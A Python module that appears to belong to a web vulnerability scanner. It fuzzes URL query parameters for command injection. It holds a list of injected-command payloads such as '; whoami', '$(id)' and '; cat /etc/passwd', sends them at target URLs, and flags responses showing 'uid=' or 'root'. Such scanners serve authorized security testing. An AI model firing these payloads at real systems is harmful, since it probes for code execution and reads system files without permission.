import asyncio
from modules.core import console

RCE_PAYLOADS = [
    "; whoami",
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| dir",
    "& dir"
]

RCE_INDICATORS = [
    "root",
    "uid=0(root)",
    "uid=",
    "gid=",
    "www-data",
    "\Windows\System32",
    "Volume Serial Number",
    "Directory of"
]

async def test_rce_url(session, url, param, payload):
    target = url.replace(f"{param}=", f"{param}={payload}")
    try:
        async with session.get(target, timeout=5) as resp:
            text = await resp.text()
            for indicator in RCE_INDICATORS:
                if indicator in text and len(text) < 5000: # Simple heuristic to avoid matching large pages with 'root' word
                     return {
                         "url": target,
                         "param": param,
                         "payload": payload,
                         "indicator": indicator
                     }
    except Exception:
        pass
    return None

async def scan_rce(session, fuzzable_urls):
    """
    Scan URLs for Remote Code Execution.
    """
    console.print(f"\n[bold cyan]--- RCE (Command Injection) Scanner ---[/bold cyan]")
    
    if not fuzzable_urls:
         console.print("[yellow][!] No parameters found to fuzz.[/yellow]")
         return []
         
    console.print(f"[dim]Fuzzing {len(fuzzable_urls)} URLs for Command Injection...[/dim]")
    
    vulnerable = []
    tasks = []
    
    for url in fuzzable_urls:
        if "=" in url:
            base, qs = url.split("?", 1)
            params = qs.split("&")
            for p in params:
                if "=" in p:
                    key = p.split("=")[0]
                    for payload in RCE_PAYLOADS:
                        tasks.append(test_rce_url(session, url, key, payload))
                        
    results = await asyncio.gather(*tasks)
    
    for res in results:
        if res:
             console.print(f"  [bold red][!] CRITICAL: RCE VULNERABILITY FOUND![/bold red]")
             console.print(f"      URL: {res['url']}")
             console.print(f"      Payload: {res['payload']}")
             vulnerable.append(res)
             
    if not vulnerable:
        console.print("[green][+] No RCE vulnerabilities detected.[/green]")
        
    return vulnerable
